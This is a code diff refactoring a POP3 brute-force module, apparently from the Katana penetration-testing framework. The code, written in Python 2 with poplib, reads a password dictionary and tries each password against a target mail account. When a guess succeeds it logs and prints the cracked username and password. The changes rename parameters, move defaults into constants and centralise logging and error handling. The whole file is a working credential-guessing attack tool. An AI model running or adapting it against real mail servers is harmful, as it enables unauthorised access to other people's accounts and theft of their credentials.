@@ -6,8 +6,11 @@
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 # Katana Core                #
 from core.design import *    #
+from core.Setting import *   #
+from core import Errors      #
 from core import help        #
 from core import ping        #
+import sys                   #
 d=DESIGN()                   #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 # Libraries                  #
@@ -16,18 +19,18 @@ import poplib                #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 # Default                    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
-defaulthost="127.0.0.1"
-defaultport="110"
-defaultaccount="admin@127.0.0.1"
-defaultdicc="core/db/pass.dicc"
+defaulthost=LOCAL_IP
+defaultport=POP_PORT
+defaultaccount=EMAIL
+defaultdicc=DITIONARY_PASSWORDS
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 
-def run(para,parb,parc,pard):
+def run(target,port,username,dictionary):
 	global defaulthost,defaultport,defaultdicc
-	defaulthost=para
-	defaultport=parb
-	defaultaccount=parc
-	defaultdicc=pard
+	defaulthost=target
+	defaultport=port
+	defaultaccount=username
+	defaultdicc=dictionary
 	btpop3(1)
 
 def btpop3(run):
@@ -75,7 +78,7 @@ def btpop3(run):
 				red=poplib.POP3(defaulthost, defaultport)
 				if True:
 					try:
-						d.loading()
+						d.loading_file()
 						try:
 							with open(defaultdicc,'r') as passs:
 								for ps in passs: 
@@ -84,29 +87,19 @@ def btpop3(run):
 										red.user(defaultaccount)
 										red.pass_(ps)
 										if True:
-											log=open('core/logs/logsBruteForce.log','a')
-											log.write('\n ===================================== ')
-											log.write('\n Module  : BruteForcePOP3')
-											log.write('\n Data    : '+time.strftime('%c'))
-											log.write('\n target  : '+defaulthost)
-											log.write('\n port    : '+defaultport)
-											log.write('\n account : '+defaultaccount)
-											log.write('\n Cracked : username : '+defaultaccount+' , password : '+ps)
-											log.close()
-											print "\n-["+colors[2]+"*"+colors[0]+"] Successfully with ("+defaultaccount+"="+ps+")\n"
+											ping.save("BruteForcePOP3",defaultaccount,ps)
+											d.Success(defaultaccount,ps)
 											btpop3(0)
 									except:
-										print " ["+colors[4]+"!"+colors[0]+"] Checking ("+defaultaccount+"="+ps+")"
+										print " "+Alr+" Checking ("+defaultaccount+"="+ps+")"
 						except:
-							d.filenot(defaultdicc)
-							btpop3(0)
+							Errors.Errors(event=sys.exc_info()[0], info=defaultdicc)
 					except:
-						d.kbi()
+						Errors.Errors(event=sys.exc_info()[0], info=False)
 			except:
-				d.off()
+				Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
 		else:
-			d.nocommand()
+			d.No_actions()
 	except:
-		d.kbi()
-		exit()
+		Errors.Errors(event=sys.exc_info()[0], info=False)
 	btpop3(0)
